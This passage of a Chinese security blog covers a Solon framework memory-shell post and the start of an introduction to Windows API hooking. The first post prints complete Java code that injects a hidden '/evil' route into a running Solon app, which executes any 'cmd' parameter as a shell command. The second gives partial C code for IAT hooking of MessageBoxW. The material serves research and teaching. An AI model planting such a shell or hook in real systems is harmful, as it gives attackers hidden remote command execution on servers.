cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, ctx.param(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, ctx.param(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    ctx.output(output);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">returnHandle</span><span class="params">(Context ctx, Action action, Object returnValue)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/10/22/Solon%E6%A1%86%E6%9E%B6%E5%86%85%E5%AD%98%E9%A9%AC/1729591297296-f59f2d67-80c0-4428-9fe6-0e1132a860d9.png"></p><h3 id="RouterHandler"><a href="#RouterHandler" class="headerlink" title="RouterHandler"></a>RouterHandler</h3><p><font style="color:#000000;">在Solon请求处理过程示意图中，注意到有一个Handler为RouterHandler，RouterHandler是Solon框架中的一个类，它实现了Handler接口，充当路由处理器的角色。在Solon框架中，RouterHandler负责处理HTTP请求和响应的路由逻辑。</font></p><p>打断点跟进分析一下org.noear.solon.core.route.RouterHandler#handle方法，在this.router中存储着当前所有的路径信息，包括对应作用的类和方法，请求路径和请求方式。</p><p><img src="/2024/10/22/Solon%E6%A1%86%E6%9E%B6%E5%86%85%E5%AD%98%E9%A9%AC/1729593416300-1a046718-25d2-4cb2-a3cd-c3e4e79ef3f2.png"></p><p><font style="color:#000000;">跟进org.noear.solon.core.route.RouterDefault#add方法，如果能够动态的向table中添加一条RouterDefault，即可添加一个恶意路由，从而实现内存马。</font></p><p><img src="/2024/10/22/Solon%E6%A1%86%E6%9E%B6%E5%86%85%E5%AD%98%E9%A9%AC/1729600958661-2650506a-98e3-485d-b1fd-90ca1f0b9a1d.png"></p><p><font style="color:#000000;">RouterHandler内存马实现代码如下。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.noear.solon.annotation.Controller;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.annotation.Mapping;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.annotation.Param;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.AppContext;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.BeanWrap;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.handle.Context;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.handle.Handler;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.handle.MethodType;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.mvc.ActionDefault;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.route.RouterDefault;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RouterHandlerMemoryShellController</span> &#123;</span><br><span class="line">    <span class="meta">@Mapping(&quot;/inject-router-handler&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(<span class="meta">@Param(defaultValue = &quot;world&quot;)</span> String name)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> Context.current();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">_request</span> <span class="operator">=</span> getfieldobj(ctx,<span class="string">&quot;_request&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">request</span> <span class="operator">=</span> getfieldobj(_request,<span class="string">&quot;request&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">serverHandler</span> <span class="operator">=</span> getfieldobj(request,<span class="string">&quot;serverHandler&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">handler</span> <span class="operator">=</span> getfieldobj(serverHandler,<span class="string">&quot;handler&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">arg$1</span> <span class="operator">=</span> getfieldobj(handler,<span class="string">&quot;arg$1&quot;</span>);</span><br><span class="line">        <span class="type">AppContext</span> <span class="variable">appContext</span> <span class="operator">=</span> (AppContext) getfieldobj(arg$<span class="number">1</span>,<span class="string">&quot;_context&quot;</span>);</span><br><span class="line">        <span class="type">RouterDefault</span> <span class="variable">_router</span> <span class="operator">=</span> (RouterDefault) getfieldobj(arg$<span class="number">1</span>,<span class="string">&quot;_router&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">BeanWrap</span> <span class="variable">beanWrap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanWrap</span>(appContext, EvilClass.class);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> EvilClass.class.getDeclaredMethod(<span class="string">&quot;MemoryShell&quot;</span>);</span><br><span class="line">        <span class="type">Handler</span> <span class="variable">newhandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ActionDefault</span>(beanWrap, method);</span><br><span class="line">        _router.add(<span class="string">&quot;/evil&quot;</span>, MethodType.ALL, newhandler);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Inject RouterHandler Memory Shell Successfully!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getfieldobj</span><span class="params">(Object obj, String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(Filename);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">fieldobj</span> <span class="operator">=</span> field.get(obj);</span><br><span class="line">            <span class="keyword">return</span> fieldobj;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getSuperclass().getDeclaredField(Filename);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">fieldobj</span> <span class="operator">=</span> field.get(obj);</span><br><span class="line">            <span class="keyword">return</span> fieldobj;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">EvilClass</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">EvilClass</span><span class="params">()</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">MemoryShell</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> Context.current();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (ctx.param(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        isLinux = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, ctx.param(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, ctx.param(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    ctx.output(output);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/10/22/Solon%E6%A1%86%E6%9E%B6%E5%86%85%E5%AD%98%E9%A9%AC/1729603644054-cc80a6da-c57c-4d95-87ec-ef821c47aa01.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://solon.noear.org/">Solon</a></li><li><a href="https://github.com/c0ny1/java-object-searcher">Java Object Searcher</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MemoryShell </tag>
            
            <tag> Solon </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hook初探</title>
      <link href="/2024/10/20/Hook/"/>
      <url>/2024/10/20/Hook/</url>
      
        <content type="html"><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p><font style="color:#000000;">Windows系统是建立在事件驱动机制上的，整个系统都是通过消息传递实现的。Hook，中文里常常被译作“钩子”或者“挂钩”，是</font><strong><font style="color:#000000;">一种特殊的消息处理机制</font></strong><font style="color:#000000;">，它可以监视系统或者进程中的各种事件消息，截获发往目标窗口的消息并进行处理。即，Hook可以改变程序执行流程，将程序原有的执行流程拦截，更改程序流向，并可以执行自己的自定义代码。Hook可以分为</font><strong><font style="color:#000000;">线程钩子</font></strong><font style="color:#000000;">和</font><strong><font style="color:#000000;">系统钩子</font></strong><font style="color:#000000;">，线程钩子可以监视指定线程的事件消息，系统钩子监视系统中的所有线程的事件消息。</font></p><p><font style="color:#000000;">Hook技术被广泛应用于安全的多个领域，例如杀毒软件的主动防御功能，涉及到对一些敏感API的监控，就需要对这些API进行Hook；窃取密码的木马病毒，为了接收键盘的输入，需要Hook键盘消息；甚至是Windows系统及一些应用程序，在打补丁时也需要用到Hook技术。</font></p><h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a><font style="color:#000000;">基本原理</font></h2><p><strong><font style="color:#000000;">在真正执行原始API之前，对程序流进行拦截，使其先执行自定义的代码后，再执行原始API调用流程</font></strong><font style="color:#000000;">。简而言之就是篡改程序的运行路径，实现执行自定义程序的目的。</font></p><p><font style="color:#000000;">例如，在calc.exe和kernel32.dll之间挂上一个钩子，将它们之间要使用的CreateFile函数替换成自定义的EvilFunc函数，即可实现想要实现的自定义功能。</font></p><p><img src="/2024/10/20/Hook/1728999047367-6824835f-796e-4eae-b5ef-b5cc92a62253.png"></p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p><font style="color:#000000;">Hook大体分为</font><strong><font style="color:#000000;">应用层Hook</font></strong><font style="color:#000000;">和</font><strong><font style="color:#000000;">内核层Hook</font></strong><font style="color:#000000;">。</font></p><ol><li><font style="color:#000000;">应用层Hook：</font><font style="color:#000000;">在Ring3层的Hook机制，主要涉及到用户态的程序和接口。这包括了对API函数的拦截和处理，例如通过IAT钩子（Import Address Table Hook）来拦截DLL的导入函数调用，或者通过Inline Hook直接在内存中修改函数的指令来实现拦截。</font><ol><li><font style="color:#000000;">消息Hook</font></li><li><font style="color:#000000;">注入Hook</font><ol><li><strong><font style="color:#000000;">IAT Hook（导入地址表钩子）</font></strong><font style="color:#000000;">：通过修改PE文件结构中的导入表来实现对特定函数调用的拦截。这种方法通常用于DLL注入，通过修改目标进程的导入表来劫持函数调用。</font></li><li><strong><font style="color:#000000;">Inline Hook（内联钩子）</font></strong><font style="color:#000000;">：直接在内存中修改函数的指令来实现拦截。这种方法通过在目标函数的指令流中插入跳转指令（如，jmp），使得函数调用被重定向到自定义的代码中。</font></li><li><strong><font style="color:#000000;">HotFix Hook（热修复钩子）</font></strong><font style="color:#000000;">：通过在函数的头部分寻找可替换的“无用”指令（例如 mov edi, edi），并将这些指令替换为跳转指令（如，EB F9）来实现拦截。这种方法不需要频繁地挂载和卸载Hook，从而避免了资源浪费，提高了效率。当需要调用原始函数时，只需跳过这个短跳转指令即可，而无需还原被替换的指令，使得Hook过程更加高效和稳定。</font></li><li><strong><font style="color:#000000;">VEH Hook（向量化异常处理钩子）</font></strong><font style="color:#000000;">：通过注册一个异常处理函数到操作系统的异常处理链表中，来实现对特定函数的拦截。当目标函数被调用时，会触发一个软件断点（如将指令修改为int 3），从而引发一个异常。VEH钩子作为异常处理程序，可以捕获这个异常，并在异常处理函数中执行自定义的代码。在处理完异常后，可以恢复原始函数的执行，或者修改寄存器和栈来改变程序的执行流程。VEH钩子的优点是它不需要修改原始函数的代码，因此可以实现无痕Hook，难以被检测工具发现。VEH钩子通常用于高级恶意软件技术，以绕过操作系统和安全软件的检测。</font></li><li><font style="color:#000000;">……</font></li></ol></li><li><font style="color:#000000;">调试Hook</font></li></ol></li><li><font style="color:#000000;">内核层Hook：</font><font style="color:#000000;">在Ring0层的Hook机制，通常涉及到更底层的系统调用和内核API的拦截。例如SSDT钩子（System Service Descriptor Table Hook），它通过修改系统服务描述符表来拦截内核API调用。</font><ol><li><strong><font style="color:#000000;">SSDT Hook（系统服务描述符表钩子）</font></strong><font style="color:#000000;">：这是一种内核层的Hook技术，通过修改SSDT表中的函数地址来拦截系统服务调用。这种方法可以用于监控和过滤系统级别的活动，如文件操作、网络通信等。</font></li><li><font style="color:#000000;">……</font></li></ol></li></ol><p><img src="/2024/10/20/Hook/1729045017221-1c2705c0-0899-47a4-b4b2-1cbcd1475214.png"></p><h2 id="常见Hook技术"><a href="#常见Hook技术" class="headerlink" title="常见Hook技术"></a>常见Hook技术</h2><h3 id="IAT-Hook"><a href="#IAT-Hook" class="headerlink" title="IAT Hook"></a>IAT Hook</h3><h4 id="基本概念-1"><a href="#基本概念-1" class="headerlink" title="基本概念"></a>基本概念</h4><p><strong><font style="color:#000000;">可移植可执行文件（ PE）：</font></strong><font style="color:#000000;">可移植可执行文件格式是一种文件格式，用于32位和64位版本的Windows操作系统中的可执行文件、目标代码、DLL、FON字体文件等。PE格式是一种数据结构，它封装了Windows操作系统加载器管理封装可执行代码所需的信息。</font></p><p><strong>导入地址表（</strong>**<font style="color:#000000;">Import Address Table，IAT</font>**<strong>）</strong>：<font style="color:#000000;">地址表在应用程序调用不同模块中的函数时用作查找表，它可以采用按序号导入和按名称导入两种形式。由于编译后的程序无法知道其所依赖的库的内存位置，因此每次调用API时都需要间接跳转。动态链接器在加载模块并将它们连接在一起时，会将实际地址写入IAT插槽，使它们指向相应库函数的内存位置。每个进程都有IAT表，当PE加载到内存中，系统会将被导入函数的地址写到对应的函数指针位置，通过IAT表，可以直接调用导入函数。</font></p><p><strong><font style="color:#000000;">导入名称表（Import Name Table，INT）</font></strong><font style="color:#000000;">：用于储存被导入函数的名称。加载PE时，系统会根据INT表的函数名，查找填充IAT的函数地址。</font></p><h4 id="实现方式"><a href="#实现方式" class="headerlink" title="实现方式"></a>实现方式</h4><p><font style="color:#000000;">IAT HOOK可以解释为</font><strong><font style="color:#000000;">操纵导入地址表，将API函数重定向到所需的内存地址</font></strong><font style="color:#000000;">，该地址可以是另一个API函数、恶意shellcode或程序代码的另一部分。要覆盖IAT中的地址，第一步是找到进程内存中IAT表的地址。查找PE文件中的任何表都需要大量的结构解析，但是查找IAT地址比大多数情况都要容易，因为它可以在PE文件可选头文件中的数据目录中找到。</font></p><p><img src="/2024/10/20/Hook/1729048487184-a966b3d2-e506-467e-8e90-ce42ab3919f4.png"></p><p><font style="color:#000000;">但是，仅仅找到导入地址表还不足以HOOK API函数。该表只包含API地址，为了替换API函数地址，还需要知道哪个条目属于将要HOOK的API函数。深入研究PE格式后可以发现，导入地址表中的地址顺序与导入名称表相同。因此，可以通过解析导入名称表来找到所需的API函数的条目编号。</font></p><p><font style="color:#000000;">在导入名称表中查找函数名需要解析PE文件的导入表中的_IMAGE_IMPORT_DESCRIPTOR结构，在解析了必要的结构并在IAT中找到API函数索引之后，在覆盖函数地址之前还需要执行另一个步骤。通常导入地址表位于内存中，只有读权限，为了覆盖表内的条目，</font><strong><font style="color:#000000;">需要将内存保护属性修改为PAGE_READWRITE</font></strong><font style="color:#000000;">。借助VirtualProtect函数，可以更改IAT的内存保护属性（或者只是需要覆盖的条目）。</font></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD   Characteristics;        </span><br><span class="line">        DWORD   OriginalFirstThunk;     <span class="comment">// RVA 指向IMAGE_THUNK_DATA结构数组(即INT表)</span></span><br><span class="line">        &#125;;</span><br><span class="line">    DWORD   TimeDateStamp;              <span class="comment">// 时间戳   </span></span><br><span class="line">    DWORD   ForwarderChain;                     </span><br><span class="line">    DWORD   Name;                       <span class="comment">// RVA,指向dll名字,该名字已0结尾                   </span></span><br><span class="line">    DWORD   FirstThunk;                 <span class="comment">// RVA,指向IMAGE_THUNK_DATA结构数组(即IAT表)         </span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;                          </span><br><span class="line"><span class="keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure><p><img src="/2024/10/20/Hook/1729068361556-1f89a7ca-9305-4e34-b8de-087d1c71ffdb.png"></p><p><img src="/2024/10/20/Hook/1729068508766-0c254228-b338-41b3-838b-c8ef2e3a1a90.png"></p><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD pOldFuncAddr = (DWORD)::GetProcAddress(LoadLibrary(<span class="string">L&quot;USER32.dll&quot;</span>), <span class="string">&quot;MessageBoxW&quot;</span>);</span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">SetIATHook</span><span class="params">(DWORD dwOldAddr, DWORD dwNewAddr)</span> &#123;</span><br><span class="line">    DWORD dwImageBase = <span class="number">0</span>;</span><br><span class="line">    PIMAGE_DOS_HEADER pDosHeader;</span><br><span class="line">    PIMAGE_NT_HEADERS pNTHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_FILE_HEADER pPEHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_OPTIONAL_HEADER32 pOptionHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_SECTION_HEADER pSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_IMPORT_DESCRIPTOR pImport = <span class="literal">NULL</span>;</span><br><span class="line">    PDWORD pIAT = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD oldProtected = <span class="number">0</span>;</span><br><span class="line">    <span class="type">bool</span> Flag = FALSE;</span><br><span class="line"></span><br><span class="line">    dwImageBase = (DWORD)::GetModuleHandle(<span class="literal">NULL</span>);</span><br><span class="line">    pDosHeader = (PIMAGE_DOS_HEADER)dwImageBase;</span><br><span class="line">    pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew);</span><br><span class="line">    pPEHeader = (PIMAGE_FILE_HEADER)((DWORD)pNTHeader + <span class="number">4</span>);</span><br><span class="line">    pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pPEHeader + IMAGE_SIZEOF_FILE_HEADER);</span><br><span class="line">    pImport = (PIMAGE_IMPORT_DESCRIPTOR)(pOptionHeader-&gt;DataDirectory[<span class="number">1</span>].VirtualAddress + dwImageBase);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定位IAT表</span></span><br><span class="line">    <span class="keyword">while</span> (pImport-&gt;FirstThunk != <span class="number">0</span> &amp;&amp; Flag == FALSE) &#123;</span><br><span class="line">        pIAT = (PDWORD)(pImport-&gt;FirstThunk + dwImageBase);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (*pIAT) &#123;</span><br><span class="line">            <span class="keyword">if</span> (*pIAT == pOldFuncAddr) &#123;</span><br><span class="line">                VirtualProtect(pIAT, <span class="number">0x4096</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtected);</span><br><span class="line">                *pIAT = dwNewAddr;</span><br><span class="line">                Flag = TRUE;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Hook Success!\n\n&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            pIAT++;</span><br><span class="line">        &#125;</span><br><span class="line">        pImport++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD <span class="title function_">UnSetIATHook</span><span class="params">(DWORD dwOldAddr, DWORD dwNewAddr)</span> &#123;</span><br><span class="line">    DWORD dwImageBase = <span class="number">0</span>;</span><br><span class="line">    PIMAGE_DOS_HEADER pDosHeader;</span><br><span class="line">    PIMAGE_NT_HEADERS pNTHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_FILE_HEADER pPEHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_OPTIONAL_HEADER32 pOptionHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_SECTION_HEADER pSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_IMPORT_DESCRIPTOR pImport = <span class="literal">NULL</span>;</span><br><span class="line">    PDWORD pIAT = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD oldProtected = <span class="number">0</span>;</span><br><span class="line">    <span class="type">bool</span> Flag = FALSE;</span><br><span class="line"></span><br><span class="line">    dwImageBase = (DWORD)::GetModuleHandle(<span class="literal">NULL</span>);   <span class="comment">// 获取进程基址</span></span><br><span class="line">    pDosHeader = (PIMAGE_DOS_HEADER)dwImageBase;</span><br><span class="line">    pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew);</span><br><span class="line">    pPEHeader = (PIMAGE_FILE_HEADER)((DWORD)pNTHeader + <span class="number">4</span>);</span><br><span class="line">    pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pPEHeader + IMAGE_SIZEOF_FILE_HEADER);</span><br><span class="line">    pImport = (PIMAGE_IMPORT_DESCRIPTOR)(pOptionHeader-&gt;DataDirectory[<span class="number">1</span>].VirtualAddress + dwImageBase);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (pImport-&gt;FirstThunk != <span class="number">0</span> &amp;&amp; Flag == FALSE) &#123;</span><br><span class="line">        pIAT = (PDWORD)(pImport-&gt;FirstThunk + dwImageBase);</span><br><span class="line">        <span class="keyword">while</span> (*pIAT) &#123;</span><br><span class="line">            <span class="keyword">if</span> (*pIAT == dwNewAddr) &#123;</span><br><span class="line">                *pIAT = dwOldAddr;</span><br><span class="line">                Flag = 